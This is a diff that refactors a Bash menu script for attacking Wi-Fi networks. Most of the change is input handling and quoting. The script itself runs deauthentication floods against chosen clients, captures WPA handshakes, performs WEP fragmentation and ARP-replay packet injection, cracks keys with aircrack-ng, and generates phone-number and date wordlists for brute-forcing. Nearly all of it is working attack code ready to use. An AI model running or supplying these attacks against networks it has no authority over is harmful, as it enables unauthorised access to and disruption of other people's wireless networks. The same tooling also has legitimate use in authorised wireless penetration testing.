@@ -27,30 +27,30 @@ if [[ -z "$AIRCRACK" ]] || [[ -z "$NMCLI" ]] || [[ -z "$MACCHANGER" ]] || [[ -z 
     DISTRO=$(for f in $(find /etc -type f -maxdepth 1 \( ! -wholename /etc/os-release ! -wholename /etc/lsb-release -wholename /etc/\*release -o -wholename /etc/\*version \) 2> /dev/null); do echo "${f:5:${#f}-13}"; done;)
     
     if [[ -z "$AIRCRACK" ]]; then
-        AIRCRACK="aircrack-ng"
+        AIRCRACK=" aircrack-ng "
     else
         unset AIRCRACK
     fi
 
     if [[ -z "$NMCLI" ]]; then
-        NMCLI="networkmanager"
+        NMCLI=" networkmanager "
     else
         unset NMCLI
     fi
 
     if [[ -z "$MACCHANGER" ]]; then
-        MACCHANGER="macchanger"
+        MACCHANGER=" macchanger "
     else
         unset MACCHANGER
     fi
 
     if [[ -z "$XTERM" ]]; then
-        XTERM="xterm"
+        XTERM=" xterm "
     else
         unset XTERM
     fi
 
-    case $DISTRO in
+    case "$DISTRO" in
         arch )
             INSTALL="pacman -S --noconfirm "
             ;;
@@ -70,23 +70,23 @@ if [[ -z "$AIRCRACK" ]] || [[ -z "$NMCLI" ]] || [[ -z "$MACCHANGER" ]] || [[ -z 
             INSTALL="apt-get -y install "
             ;;
         OpenSUSE )
-            INSTALL="zypper -n install "             
+            INSTALL="zypper -n install "
             ;;
         fedora )
             INSTALL="dnf -y install "
             ;;
         * )
-            echo -ne "Unable to determine Linux Distribution! Install \"$AIRCRACK\" \"$NMCLI\" \"$MACCHANGER\" \"$XTERM\" manually."
+            echo -ne "Unable to determine Linux Distribution! Install$AIRCRACK$NMCLI$MACCHANGER$XTERM manually."
             exit 1
     esac
 
-    read -p "$AIRCRACK $NMCLI $MACCHANGER $XTERM not found on your system, install now [yn] ? " DYN
+    read -rp "-->$AIRCRACK$NMCLI$MACCHANGER$XTERM not found on your system, install now [yn] ? " DYN
     if [[ "$DYN" = [Yy] ]]; then
         $INSTALL $AIRCRACK $NMCLI $MACCHANGER $XTERM
         resolve_dependencies
     else
         clear
-        echo "$AIRCRACK $NMCLI $MACCHANGER $XTERM not found on your system."
+        echo "-->$AIRCRACK$NMCLI$MACCHANGER$XTERM not found on your system."
         exit 1
     fi
 else
@@ -97,9 +97,9 @@ function phones_wl {
 clear
 echo "------- Phone number generator, using crunch. -------"
 echo
-read -p "Enter Phone Number digit length : " LENGTH
-read -p "Enter Phone prefix : " PREFIX
-read -p "Enter number of recurring digits (Press Enter to skip) : " RECURRING
+read -rp "Enter Phone Number digit length : " LENGTH
+read -rp "Enter Phone prefix : " PREFIX
+read -rp "Enter number of recurring digits (Press Enter to skip) : " RECURRING
 TMP_1=${#PREFIX}
 TMP_2=$(("$LENGTH" - "$TMP_1" + 1))
 TMP_3=$(seq -s% "$TMP_2" | tr -d '[:digit:]')
@@ -114,7 +114,7 @@ GEN=$?
 if [[ "$GEN" -eq 0 ]]; then
     echo
     echo "Wordlist successfully generated."
-    read -p "Press Enter to go back..." KEY
+    read -rp "Press Enter to go back..." KEY
     unset LENGTH
     unset PREFIX
     unset RECURRING
@@ -127,7 +127,7 @@ if [[ "$GEN" -eq 0 ]]; then
     go_back
 else
     echo "Either something went wrong or you entered no values, check function \"generate_wordlists\"."
-    read -p "Press Enter to go back..." KEY
+    read -rp "Press Enter to go back..." KEY
     unset LENGTH
     unset PREFIX
     unset RECURRING
@@ -163,7 +163,7 @@ echo "--------------------- Date Generator ---------------------"
 echo
 echo "Date range : $SMIN_DATE/$SMIN_MONTH/$SMIN_YEAR - $SMAX_DATE/$SMAX_MONTH/$SMAX_YEAR"
 echo
-read -p "Enter minimum DATE (Enter to use defaults) : " VAR
+read -rp "Enter minimum DATE (Enter to use defaults) : " VAR
 SMIN_DATE=$VAR
 while ! [[ "$VAR" -ge "$MIN_DATE" && "$VAR" -le "$MAX_DATE" ]]; do
     if [[ -z "$VAR" ]]; then
@@ -173,7 +173,7 @@ while ! [[ "$VAR" -ge "$MIN_DATE" && "$VAR" -le "$MAX_DATE" ]]; do
         SMIN_DATE=$VAR
         break
     else
-        read -p "$VAR is out of bounds, new input [$MIN_DATE..$MAX_DATE] : " VAR
+        read -rp "$VAR is out of bounds, new input [$MIN_DATE..$MAX_DATE] : " VAR
         SMIN_DATE=$VAR
     fi
 done
@@ -184,7 +184,7 @@ echo "--------------------- Date Generator ---------------------"
 echo
 echo "Date range : $SMIN_DATE/$SMIN_MONTH/$SMIN_YEAR - $SMAX_DATE/$SMAX_MONTH/$SMAX_YEAR"
 echo
-read -p "Enter maximum DATE (Enter to use defaults) : " VAR
+read -rp "Enter maximum DATE (Enter to use defaults) : " VAR
 SMAX_DATE=$VAR
 while ! [[ "$VAR" -ge "$MIN_DATE" && "$VAR" -le "$MAX_DATE" ]]; do
     if [[ -z "$VAR" ]]; then
@@ -194,7 +194,7 @@ while ! [[ "$VAR" -ge "$MIN_DATE" && "$VAR" -le "$MAX_DATE" ]]; do
         SMAX_DATE=$VAR
         break
     else
-        read -p "$VAR is out of bounds, new input [$MIN_DATE..$MAX_DATE] : " VAR
+        read -rp "$VAR is out of bounds, new input [$MIN_DATE..$MAX_DATE] : " VAR
         SMAX_DATE=$VAR
     fi
 done
@@ -205,7 +205,7 @@ echo "--------------------- Date Generator ---------------------"
 echo
 echo "Date range : $SMIN_DATE/$SMIN_MONTH/$SMIN_YEAR - $SMAX_DATE/$SMAX_MONTH/$SMAX_YEAR"
 echo
-read -p "Enter minimum MONTH (Enter to use defaults) : " VAR
+read -rp "Enter minimum MONTH (Enter to use defaults) : " VAR
 SMIN_MONTH=$VAR
 while ! [[ "$VAR" -ge "$MIN_MONTH" && "$VAR" -le "$MAX_MONTH" ]]; do
     if [[ -z "$VAR" ]]; then
@@ -215,7 +215,7 @@ while ! [[ "$VAR" -ge "$MIN_MONTH" && "$VAR" -le "$MAX_MONTH" ]]; do
         SMIN_MONTH=$VAR
         break
     else
-        read -p "$VAR is out of bounds, new input [$MIN_MONTH..$MAX_MONTH] : " VAR
+        read -rp "$VAR is out of bounds, new input [$MIN_MONTH..$MAX_MONTH] : " VAR
         SMIN_MONTH=$VAR
     fi
 done
@@ -226,7 +226,7 @@ echo "--------------------- Date Generator ---------------------"
 echo
 echo "Date range : $SMIN_DATE/$SMIN_MONTH/$SMIN_YEAR - $SMAX_DATE/$SMAX_MONTH/$SMAX_YEAR"
 echo
-read -p "Enter maximum MONTH (Enter to use defaults) : " VAR
+read -rp "Enter maximum MONTH (Enter to use defaults) : " VAR
 SMAX_MONTH=$VAR
 while ! [[ "$VAR" -ge "$MIN_MONTH" && "$VAR" -le "$MAX_MONTH" ]]; do
     if [[ -z "$VAR" ]]; then
@@ -236,7 +236,7 @@ while ! [[ "$VAR" -ge "$MIN_MONTH" && "$VAR" -le "$MAX_MONTH" ]]; do
         SMAX_MONTH=$VAR
         break
     else
-        read -p "$VAR is out of bounds, new input [$MIN_MONTH..$MAX_MONTH] : " VAR
+        read -rp "$VAR is out of bounds, new input [$MIN_MONTH..$MAX_MONTH] : " VAR
         SMAX_MONTH=$VAR
     fi
 done
@@ -247,7 +247,7 @@ echo "--------------------- Date Generator ---------------------"
 echo
 echo "Date range : $SMIN_DATE/$SMIN_MONTH/$SMIN_YEAR - $SMAX_DATE/$SMAX_MONTH/$SMAX_YEAR"
 echo
-read -p "Enter minimum YEAR (Enter to use defaults) : " VAR
+read -rp "Enter minimum YEAR (Enter to use defaults) : " VAR
 SMIN_YEAR=$VAR
 while ! [[ "$VAR" -ge "$MIN_YEAR" && "$VAR" -le "$MAX_YEAR" ]]; do
     if [[ -z "$VAR" ]]; then
@@ -257,7 +257,7 @@ while ! [[ "$VAR" -ge "$MIN_YEAR" && "$VAR" -le "$MAX_YEAR" ]]; do
         SMIN_YEAR=$VAR
         break
     else
-        read -p "$VAR is out of bounds, new input [$MIN_YEAR..$MAX_YEAR] : " VAR
+        read -rp "$VAR is out of bounds, new input [$MIN_YEAR..$MAX_YEAR] : " VAR
         SMIN_YEAR=$VAR
     fi
 done
@@ -268,7 +268,7 @@ echo "--------------------- Date Generator ---------------------"
 echo
 echo "Date range : $SMIN_DATE/$SMIN_MONTH/$SMIN_YEAR - $SMAX_DATE/$SMAX_MONTH/$SMAX_YEAR"
 echo
-read -p "Enter maximum YEAR (Enter to use defaults) : " VAR
+read -rp "Enter maximum YEAR (Enter to use defaults) : " VAR
 SMAX_YEAR=$VAR
 while ! [[ "$VAR" -ge "$MIN_YEAR" && "$VAR" -le "$MAX_YEAR" ]]; do
     if [[ -z "$VAR" ]]; then
@@ -278,7 +278,7 @@ while ! [[ "$VAR" -ge "$MIN_YEAR" && "$VAR" -le "$MAX_YEAR" ]]; do
         SMAX_YEAR=$VAR
         break
     else
-        read -p "$VAR is out of bounds, new input [$MIN_YEAR..$MAX_YEAR] : " VAR
+        read -rp "$VAR is out of bounds, new input [$MIN_YEAR..$MAX_YEAR] : " VAR
         SMAX_YEAR=$VAR
     fi
 done
@@ -290,117 +290,100 @@ echo
 echo "The program will generate the following wordlist." 
 echo "Date range : $SMIN_DATE/$SMIN_MONTH/$SMIN_YEAR - $SMAX_DATE/$SMAX_MONTH/$SMAX_YEAR"
 echo
-read -p "Confirm ? [yn] " KEY
+echo "Confirm ? [yn] "
 echo
-if [[ "$KEY" = [Yy] ]]; then
-    DATES=$(seq -w $SMIN_DATE $SMAX_DATE)
-    MONTHS=$(seq -w $SMIN_MONTH $SMAX_MONTH)
-    YEARS=$(seq -w $SMIN_YEAR $SMAX_YEAR)
-    for i in ${YEARS[@]}; do
-        for j in ${MONTHS[@]}; do
-            for s in ${DATES[@]}; do
-                echo "$s$j$i" >> "$SMIN_YEAR-$SMAX_YEAR.lst"
-                SUCCESS="$?"
+while read -rn1 KEY
+do
+    case "$KEY" in
+        [Yy] )
+            DATES=$(seq -w "$SMIN_DATE" "$SMAX_DATE")
+            MONTHS=$(seq -w "$SMIN_MONTH" "$SMAX_MONTH")
+            YEARS=$(seq -w "$SMIN_YEAR" "$SMAX_YEAR")
+            for i in ${YEARS[@]}; do
+                for j in ${MONTHS[@]}; do
+                    for s in ${DATES[@]}; do
+                        echo "$s$j$i" >> "$SMIN_YEAR-$SMAX_YEAR.lst"
+                        SUCCESS="$?"
+                    done
+                done
             done
-        done
-    done
-elif [[ "$KEY" = [Nn] ]]; then
-    unset SUCCESS
-    unset DATES
-    unset MONTHS
-    unset YEARS
-    unset MIN_DATE
-    unset MAX_DATE
-    unset MIN_MONTH
-    unset MAX_MONTH
-    unset MIN_YEAR
-    unset MAX_YEAR
-    unset SMIN_DATE
-    unset SMAX_DATE
-    unset SMIN_MONTH
-    unset SMAX_MONTH
-    unset SMIN_YEAR
-    unset SMAX_YEAR
-    unset i
-    unset j
-    unset s
-    go_back
-else
-    read -p "Rerun ? [yn] " KEY
-    if [[ "$KEY" = [Yy] ]]; then
-        dates_wl
-    else
-        unset SUCCESS
-        unset DATES
-        unset MONTHS
-        unset YEARS
-        unset MIN_DATE
-        unset MAX_DATE
-        unset MIN_MONTH
-        unset MAX_MONTH
-        unset MIN_YEAR
-        unset MAX_YEAR
-        unset SMIN_DATE
-        unset SMAX_DATE
-        unset SMIN_MONTH
-        unset SMAX_MONTH
-        unset SMIN_YEAR
-        unset SMAX_YEAR
-        unset i
-        unset j
-        unset s
-        go_back
-    fi
-fi
-if [[ "$?" = 0 ]]; then
-    echo 
-    echo "Wordlist generated successfully!"
-    echo "Saved as $SMIN_YEAR-$SMAX_YEAR.lst"
-    echo
-    read -p "Press Enter to go back." KEY
-    unset SUCCESS
-    unset DATES
-    unset MONTHS
-    unset YEARS
-    unset MIN_DATE
-    unset MAX_DATE
-    unset MIN_MONTH
-    unset MAX_MONTH
-    unset MIN_YEAR
-    unset MAX_YEAR
-    unset SMIN_DATE
-    unset SMAX_DATE
-    unset SMIN_MONTH
-    unset SMAX_MONTH
-    unset SMIN_YEAR
-    unset SMAX_YEAR
-    unset i
-    unset j
-    unset s
-    go_back
-else
-    read -p "Something went wrong, check output." KEY
-    unset SUCCESS
-    unset DATES
-    unset MONTHS
-    unset YEARS
-    unset MIN_DATE
-    unset MAX_DATE
-    unset MIN_MONTH
-    unset MAX_MONTH
-    unset MIN_YEAR
-    unset MAX_YEAR
-    unset SMIN_DATE
-    unset SMAX_DATE
-    unset SMIN_MONTH
-    unset SMAX_MONTH
-    unset SMIN_YEAR
-    unset SMAX_YEAR
-    unset i
-    unset j
-    unset s
-    go_back
-fi
+            if [[ "$?" = 0 ]]; then
+                echo 
+                echo "Wordlist generated successfully!"
+                echo "Saved as $SMIN_YEAR-$SMAX_YEAR.lst"
+                echo
+                read -rp "Press Enter to go back." KEY
+                unset SUCCESS
+                unset DATES
+                unset MONTHS
+                unset YEARS
+                unset MIN_DATE
+                unset MAX_DATE
+                unset MIN_MONTH
+                unset MAX_MONTH
+                unset MIN_YEAR
+                unset MAX_YEAR
+                unset SMIN_DATE
+                unset SMAX_DATE
+                unset SMIN_MONTH
+                unset SMAX_MONTH
+                unset SMIN_YEAR
+                unset SMAX_YEAR
+                unset i
+                unset j
+                unset s
+                go_back
+            else
+                read -rp "Something went wrong, check output." KEY
+                unset SUCCESS
+                unset DATES
+                unset MONTHS
+                unset YEARS
+                unset MIN_DATE
+                unset MAX_DATE
+                unset MIN_MONTH
+                unset MAX_MONTH
+                unset MIN_YEAR
+                unset MAX_YEAR
+                unset SMIN_DATE
+                unset SMAX_DATE
+                unset SMIN_MONTH
+                unset SMAX_MONTH
+                unset SMIN_YEAR
+                unset SMAX_YEAR
+                unset i
+                unset j
+                unset s
+                go_back
+            fi
+            ;;
+        [Nn] )
+            unset SUCCESS
+            unset DATES
+            unset MONTHS
+            unset YEARS
+            unset MIN_DATE
+            unset MAX_DATE
+            unset MIN_MONTH
+            unset MAX_MONTH
+            unset MIN_YEAR
+            unset MAX_YEAR
+            unset SMIN_DATE
+            unset SMAX_DATE
+            unset SMIN_MONTH
+            unset SMAX_MONTH
+            unset SMIN_YEAR
+            unset SMAX_YEAR
+            unset i
+            unset j
+            unset s
+            go_back
+            ;;
+        * )
+            echo -ne "\n[n] Cancel [y] Generate "
+            ;;
+    esac
+done
 }
 function generate_wordlists {
 clear
@@ -414,9 +397,9 @@ echo "c) Cancel"
 echo
 SELECT="Select : "
 echo -n "$SELECT"
-while read -n1 WORD
+while read -rn1 WORD
 do
-    case $WORD in
+    case "$WORD" in
         d )
             dates_wl
             break
@@ -426,7 +409,7 @@ do
             if [[ -z "$CRUNCH" ]]; then
                 echo
                 echo "Crunch is not installed. Install it and try again."
-                read -p "Press Enter to go back..." KEY
+                read -rp "Press Enter to go back..." KEY
                 unset CRUNCH
                 go_back
             fi
@@ -439,6 +422,7 @@ do
             ;;
         * )
             echo -ne "\n$SELECT"
+            ;;
     esac
 done
 }
@@ -546,18 +530,18 @@ echo
 echo "c) Cancel"
 echo
 echo -n "$SELECT"
-while read -n1 MODE
+while read -rn1 MODE
 do
-    case $MODE in
+    case "$MODE" in
         1 )
-            MODE=WEP
+            MODE="WEP"
             list_APs
             set_mon
             wep_attacks
             break
             ;;
         2 )
-            MODE=WPA
+            MODE="WPA"
             list_APs
             set_mon
             wpa_attacks
@@ -569,15 +553,16 @@ do
             ;;
         * )
             echo -ne "\n$SELECT"
+            ;;
     esac
 done
 }
 function list_APs {
 clear
-echo "------------------ Access Point Selection ------------------"
+echo "----------------------- <Access Point Selection> -----------------------"
 echo
 echo "Filtered by : $MODE"
-if [[ -n $STATE ]]; then
+if [[ -n "$STATE" ]]; then
     echo
     echo "Please wait ..."
     unset_mon >> /dev/null
@@ -587,13 +572,14 @@ readarray -t LINES < <(nmcli -t -f SSID,CHAN,BSSID,SECURITY,SIGNAL dev wifi list
 if [[ -z "$LINES" ]]; then
     echo "No $MODE Networks found."
     echo
-    read -p "Press Enter to go back" KEY
+    read -rp "Press Enter to go back" KEY
     go_back
 else
     echo
     echo "Select an AP and press Enter or Select 1 to rescan"
     echo
-    echo "SSID  CHAN    BSSID   SECURITY    SIGNAL"
+    echo "   SSID  CHAN    BSSID   SECURITY    SIGNAL"
+    echo
     select CHOICE in "Scan Again" "${LINES[@]}"; do
         if [[ "$CHOICE" = "Scan Again" ]]; then
             list_APs
@@ -601,23 +587,26 @@ else
         [[ -n "$CHOICE" ]] || { echo "Invalid choice. Try again." >&2; continue; }
         break
     done
-    read -r AP <<< "$CHOICE"
+    AP="$CHOICE"
     BSSID=$(echo "$AP" | awk -F ':' '{print $3} {print $4} {print $5} {print $6} {print $7} {print $8}' | sed 's/\\/\:/g' | xargs | sed 's/ //g')
     CHAN=$(echo "$AP" | awk -F ':' '{print $2}')
     ESSID=$(echo "$AP" | awk -F ':' '{print $1}')
-    SIG=$(echo $AP | awk -F ':' '{print $NF}')
+    SIG=$(echo "$AP" | awk -F ':' '{print $NF}')
     CHANFLAG=1
     REPLY="$CHAN"
-    echo
-    echo "You picked ($AP)"
-    echo "The new interface will be set on channel : $CHAN."
 fi
+}
+function de-auth {
+echo
+read -rp "Enter Client MAC you wish to de-auth and press enter. : " CLIENT
+read -rp "How many times ? " TIMES
+aireplay-ng -0 "$TIMES" -a "$BSSID" -c "$CLIENT" "$IFACE"
 }
 function wpa_attacks {
 clear
 echo "------------ WPA1/2 4-Way Handshake Capture ------------"
-read -p "Press Enter to continue ? " KEY
-IFACE=$(ls /sys/class/net | grep "$IFACE")
+read -rp "Press Enter to continue ? " KEY
+IFACE=$(find /sys/class/net -name "wl*" | awk -F/ '{print $NF}' | grep "$IFACE")
 ESSID=$(tr -d ' ' <<< "$ESSID")
 AIRODUMP="airodump-ng --bssid $BSSID -c $CHAN -w $ESSID $IFACE"
 env -u SESSION_MANAGER xterm -hold -e "$AIRODUMP" &
@@ -627,52 +616,80 @@ echo
 echo
 echo "When a client you want to de-auth shows up in the airodump-ng window. Press Space to pause the output, select the MAC address and Press Ctrl + Shift + C to copy it. Then paste it here and press Space on the airodump-ng window to continue the output."
 echo
-read -p "Are any clients connected ? [yn] " ANSWER
-if [[ "$ANSWER" = [Yy] ]]; then
-    ASN=y
-    while [[ "$ASN" != [Nn] ]]; do
-        read -p "Enter Client MAC you wish to de-auth and press enter. : " CLIENT
-        read -p "How many times ? " TIMES
-        aireplay-ng -0 "$TIMES" -a "$BSSID" -c "$CLIENT" "$IFACE"
-        read -p "Try again with same settings [yn] " ASN
-        while [[ "$ASN" = [Yy] ]]; do
-            aireplay-ng -0 "$TIMES" -a "$BSSID" -c "$CLIENT" "$IFACE"
-            read -p "Try again with same settings [yn] " ASN
-        done
-    done
-    echo
-    kill "$(pgrep xterm)"
-    echo "You need the $ESSID.cap file in order to feed it to aircrack-ng and brute-force the password. Consider keeping it."
-    echo
-    read -p "Press Enter to continue..." KEY
-    clean_up
-    echo
-    read -p "Press Enter to go back " KEY
-    unset ASN
-    unset ESSID
-    unset AIRODUMP
-    unset CHAN
-    unset BSSID
-    go_back
-else
-    kill "$(pgrep xterm)"
-    rm -f "$ESSID"*.netxml
-    rm -f "$ESSID"*.cap
-    rm -f "$ESSID"*.csv
-    rm -f replay*.cap
-    echo
-    unset ESSID
-    unset AIRODUMP
-    unset CHAN
-    unset BSSID
-    read -p "Press Enter to go back " KEY
-    go_back
-fi
+
+CNT="Are any clients connected ? [yn] "
+echo "$CNT"
+while read -rn1 YESNO
+do
+    case "$YESNO" in
+        [Yy] )
+            de-auth
+            CONNECT="[c] Cancel [y] Try again [n] Change settings : "
+            echo -n "$CONNECT"
+            while read -rn1 CON
+            do
+                case "$CON" in
+                    [Yy] )
+                        echo
+                        aireplay-ng -0 "$TIMES" -a "$BSSID" -c "$CLIENT" "$IFACE"
+                        echo -n "$CONNECT"
+                        ;;
+                    [Nn] )
+                        de-auth
+                        echo -n "$CONNECT"
+                        ;;
+                    [Cc] )
+                        kill "$(pgrep xterm)"
+						clean_up
+                        echo
+                        unset YESNO
+                        unset CONNECT
+                        unset CON
+                        unset ESSID
+                        unset AIRODUMP
+                        unset TIMES
+                        unset CLIENT
+                        unset CHAN
+                        unset BSSID
+                        read -rp "Press Enter to go back " KEY
+                        go_back
+                        break
+                        ;;
+                    * )
+                        echo -ne "\n$CONNECT"
+                        ;;
+                esac
+            done
+            break
+            ;;
+        [Nn] )
+            kill "$(pgrep xterm)"
+            rm -f "$ESSID"*.netxml
+            rm -f "$ESSID"*.cap
+            rm -f "$ESSID"*.csv
+            rm -f replay*.cap
+            echo
+            unset YESNO
+            unset CONNECT
+            unset CON
+            unset ESSID
+            unset AIRODUMP
+            unset CHAN
+            unset BSSID
+            read -rp "Press Enter to go back " KEY
+            go_back
+            break
+            ;;
+        * )
+            echo -ne "\n$CNT"
+            ;;
+    esac
+done
 }
 function clean_up {
 echo
-read -p "Clean up $ESSID.cap, $ESSID.csv, $ESSID.netxml and replay files ? [yn] " ASR
-read -p "Keep $ESSID.cap file ? [yn] " ANS
+read -rp "Clean up $ESSID.cap, $ESSID.csv, $ESSID.netxml and replay files ? [yn] " ASR
+read -rp "Keep $ESSID.cap file ? [yn] " ANS
 if [[ "$ASR" = [Yy] && "$ANS" = [Yy] ]]; then
     rm -f "$ESSID"*.netxml
     rm -f "$ESSID"*.csv
@@ -698,7 +715,7 @@ function fragmentation {
 clear
 echo "------------ WEP Fragmentation method ------------"
 echo
-read -p "Press Enter to continue ? " KEY
+read -rp "Press Enter to continue ? " KEY
 if [[ -z "$STATE" ]]; then
     echo
     echo "Setting M/M on $IFACE"
@@ -727,7 +744,7 @@ until [[ "$COUNTER" -eq 3 ]]; do
 done
 if [[ "$SUCCESS" != 0 ]]; then
     echo "Unable to Associate to $ESSID, make sure your WLAN interface supports injection."
-    read -p "Test injection now ? [yn] " INJ
+    read -rp "Test injection now ? [yn] " INJ
     if [[ "$INJ" = [Yy] ]]; then
         test_injection
     fi
@@ -740,7 +757,7 @@ if [[ "$SUCCESS" != 0 ]]; then
     unset SUCCESS
     unset COUNTER
     unset PRGA
-    read -p "Press Enter to go back" KEY
+    read -rp "Press Enter to go back" KEY
     go_back
 fi
 aireplay-ng -5 -b "$BSSID" -h "$NEWMAC" "$IFACE"
@@ -752,14 +769,14 @@ if [[ "$PRGA" = 0 ]]; then
         echo
         echo "No .xor file found."
         echo
-        unset ESSID                               
+        unset ESSID
         unset CHAN
         unset BSSID
         unset PRGA
         unset EXT
         unset FRAGMENT
         unset INJ
-        read -p "Press Enter to go back" KEY
+        read -rp "Press Enter to go back" KEY
         go_back
     fi
     packetforge-ng -0 -a "$BSSID" -h "$NEWMAC" -k 255.255.255.255 -l 255.255.255.255 -y "$FRAGMENT" -w "$ESSID""$EXT"
@@ -768,65 +785,74 @@ if [[ "$PRGA" = 0 ]]; then
     echo y | aireplay-ng -2 -r "$ESSID""$EXT" "$IFACE" &>/dev/null &
     clear
     echo 
-    read -p "Crack $ESSID now [yn] ? " ANSWER
-    if [[ "$ANSWER" = [Yy] ]]; then
-        CAPFILE=$(find "$(pwd)" -name "$ESSID*.cap" -printf '%T@ %p\n' | sort -k1 -n | awk -F ' ' '{print $2}' | tail -1)
-        if [[ -z "$CAPFILE" ]]; then
-            echo
-            echo "No $ESSID.cap files found."
-            echo
-            kill "$(pgrep aireplay-ng)"
-            killall xterm
-            clean_up
-            unset ESSID
-            unset CHAN
-            unset BSSID
-            unset PRGA
-            unset EXT
-            unset FRAGMENT
-            unset INJ
-            unset CAPFILE
-            read -p "Press Enter to go back" KEY
-            go_back
-        fi
-        CRACK="aircrack-ng -b $BSSID $CAPFILE"
-        env -u SESSION_MANAGER xterm -hold -e "$CRACK" &
-        clear
-        echo "Wait for aircrack-ng to finish. The password will be in this form (XX:XX:XX:XX:XX:XX)."
-        echo
-        echo "WARNING! xterm windows will close, copy the password before continuing."
-        echo
-        read -p "Press Enter to clean up files and go back..." KEY
-        kill "$(pgrep aireplay-ng)"
-        killall xterm
-        clean_up
-        unset ESSID
-        unset CHAN
-        unset BSSID
-        unset PRGA
-        unset EXT
-        unset FRAGMENT
-        unset INJ
-        unset CAPTURE
-        go_back
-    else
-        kill "$(pgrep aireplay-ng)"
-        killall xterm
-        clean_up
-        unset ESSID
-        unset CHAN
-        unset BSSID
-        unset PRGA
-        unset EXT
-        unset FRAGMENT
-        unset INJ
-        unset CAPTURE
-        read -p "Press Enter to go back" KEY
-        go_back
-    fi
+    echo "Crack $ESSID now [yn] ? "
+    while read -rn1 ANSWER
+    do
+        case "$ANSWER" in
+            [Yy] )
+                CAPFILE=$(find "$(pwd)" -name "$ESSID*.cap" -printf '%T@ %p\n' | sort -k1 -n | awk -F ' ' '{print $2}' | tail -1)
+                if [[ -z "$CAPFILE" ]]; then
+                    echo
+                    echo "No $ESSID.cap files found."
+                    echo
+                    kill "$(pgrep aireplay-ng)"
+                    killall xterm
+                    clean_up
+                    unset ESSID
+                    unset CHAN
+                    unset BSSID
+                    unset PRGA
+                    unset EXT
+                    unset FRAGMENT
+                    unset INJ
+                    unset CAPFILE
+                    read -rp "Press Enter to go back" KEY
+                    go_back
+                fi
+                CRACK="aircrack-ng -b $BSSID $CAPFILE"
+                env -u SESSION_MANAGER xterm -hold -e "$CRACK" &
+                clear
+                echo "Wait for aircrack-ng to finish. The password will be in this form (XX:XX:XX:XX:XX:XX)."
+                echo
+                echo "WARNING! xterm windows will close, copy the password before continuing."
+                echo
+                read -rp "Press Enter to clean up files and go back..." KEY
+                kill "$(pgrep aireplay-ng)"
+                killall xterm
+                clean_up
+                unset ESSID
+                unset CHAN
+                unset BSSID
+                unset PRGA
+                unset EXT
+                unset FRAGMENT
+                unset INJ
+                unset CAPTURE
+                go_back
+                ;;
+            [Nn] )
+                kill "$(pgrep aireplay-ng)"
+                killall xterm
+                clean_up
+                unset ESSID
+                unset CHAN
+                unset BSSID
+                unset PRGA
+                unset EXT
+                unset FRAGMENT
+                unset INJ
+                unset CAPTURE
+                read -rp "Press Enter to go back" KEY
+                go_back
+                ;;
+            * )
+                echo -ne "\nInvalid choice, enter y or n "
+                ;;
+        esac
+    done
 else
     echo
-    read -p "Fragmentation method failed. Try Chop-Chop ?" ANSWER
+    read -rp "Fragmentation method failed. Try Chop-Chop ?" ANSWER
     if [[ "$ANSWER" = [Yy] ]]; then
        echo "TODO"
        exit 1
@@ -837,7 +863,7 @@ function arp_replay {
 clear
 echo "------------ WEP ARP replay method ------------"
 echo
-read -p "Press Enter to continue ? " KEY
+read -rp "Press Enter to continue ? " KEY
 if [[ -z "$STATE" ]]; then
     echo
     echo "Setting M/M on $IFACE"
@@ -868,7 +894,7 @@ until [[ "$COUNTER" -eq 3 ]]; do
 done
 if [[ "$SUCCESS" != 0 ]]; then
     echo "Unable to Associate to $ESSID, make sure your WLAN interface supports injection."
-    read -p "Test injection now ? [yn] " INJ
+    read -rp "Test injection now ? [yn] " INJ
     if [[ "$INJ" = [Yy] ]]; then
         test_injection
     fi
@@ -877,80 +903,64 @@ if [[ "$SUCCESS" != 0 ]]; then
     unset AIRODUMP
     unset CHAN
     unset BSSID
-    read -p "Press Enter to go back" KEY
+    read -rp "Press Enter to go back" KEY
     go_back
 fi
-echo "Wait for #Data in airodump-ng to reach at least 15K..."
-read -p "Is the #Data collumn increasing ? [yn] " ANS
-echo
-if [[ "$ANS" = [Yy] ]]; then
-    read -p "Try cracking $ESSID now ? [yn] : " ANSWER
-    if [[ "$ANSWER" = [Yy] ]]; then
-        CAP=$(find "$(pwd)" -name "$ESSID*.cap" -printf '%T@ %p\n' | sort -k1 -n | awk -F ' ' '{print $2}' | tail -1)
-        if [[ -z "$CAP" ]]; then
-            echo "No $ESSID.cap files found."
+echo "Wait for #Data in airodump-ng to reach at least 15K before you proceed..."
+echo "Proceed ? [yn] "
+while read -rn1 ANS
+do
+    case "$ANS" in
+        [Yy] )
+            CAP=$(find "$(pwd)" -name "$ESSID*.cap" -printf '%T@ %p\n' | sort -k1 -n | awk -F ' ' '{print $2}' | tail -1)
+            COMMAND="aircrack-ng $CAP"
+            env -u SESSION_MANAGER xterm -hold -e "$COMMAND" &
+            clear
+            echo "Wait for aircrack-ng to finish, then copy the password."
             echo
+            echo "WARNING! xterm windows will close, copy the password before continuing."
+            echo
+            read -rp "Press Enter to clean up files and go back..." KEY
+            kill "$(pgrep aireplay-ng)"
+            killall xterm
+            clean_up
             unset ESSID
             unset AIRODUMP
             unset CHAN
             unset BSSID
+            unset ANS
             unset CAP
-            read -p "Press Enter to go back" KEY
+            unset CHOICE
+            unset INJ
+            unset ANSWER
+            read -rp "Press Enter to go back" KEY
             go_back
-        fi
-        COMMAND="aircrack-ng $CAP"
-        env -u SESSION_MANAGER xterm -hold -e "$COMMAND" &
-        clear
-        echo "Wait for aircrack-ng to finish, then copy the password."
-        echo
-        echo "WARNING! xterm windows will close, copy the password before continuing."
-        echo
-        read -p "Press Enter to clean up files and go back..." KEY
-        kill "$(pgrep aireplay-ng)"
-        killall xterm
-        clean_up
-        unset ESSID
-        unset AIRODUMP
-        unset CHAN
-        unset BSSID
-        unset ANS
-        unset CAP
-        unset CHOICE
-        unset INJ
-        unset ANSWER
-        read -p "Press Enter to go back" KEY
-        go_back
-    else
-        kill "$(pgrep aireplay-ng)"
-        kill "$(pgrep xterm)"
-        clean_up
-        unset ESSID
-        unset AIRODUMP
-        unset CHAN
-        unset BSSID
-        unset ANS
-        unset CAP
-        unset CHOICE
-        unset INJ
-        unset ANSWER
-        read -p "Press Enter to exit and go back. " KEY
-        go_back
-    fi
-elif [[ "$ANS" = [Nn] ]]; then
-    echo "Consider using Fragmentation attack method."
-    kill "$(pgrep aireplay-ng)"
-    kill "$(pgrep xterm)"
-    clean_up
-    unset ESSID
-    unset AIRODUMP
-    unset CHAN
-    unset BSSID
-    read -p "Press Enter to exit and go back. " KEY
